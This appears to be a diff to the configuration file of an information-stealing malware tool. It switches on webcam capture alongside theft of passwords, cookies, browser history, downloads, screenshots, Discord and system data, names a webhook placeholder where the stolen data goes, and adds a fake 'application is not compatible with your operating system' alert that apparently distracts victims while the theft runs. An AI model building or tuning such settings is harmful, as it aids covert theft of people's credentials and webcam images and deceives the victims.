@@ -4,11 +4,14 @@
     "system_info": true,
     "network_info": true,
     "discord_info": true,
-    "webcam_photo": false,
+    "webcam_photo": true,
     "screenshot": true,
     "password": true,
     "browser_downloads": true,
     "browser_history": true,
     "cookies": true,
-    "WEBHOOK": "put ur webhook here"
+    "WEBHOOK": "put ur webhook here",
+    "ALERT": true,
+    "ALERT_TITLE": "Alert",
+    "ALERT_CONTENT": "The application is not compatible with your current operating system. Please check the minimum system requirements or contact support for further assistance."
 }
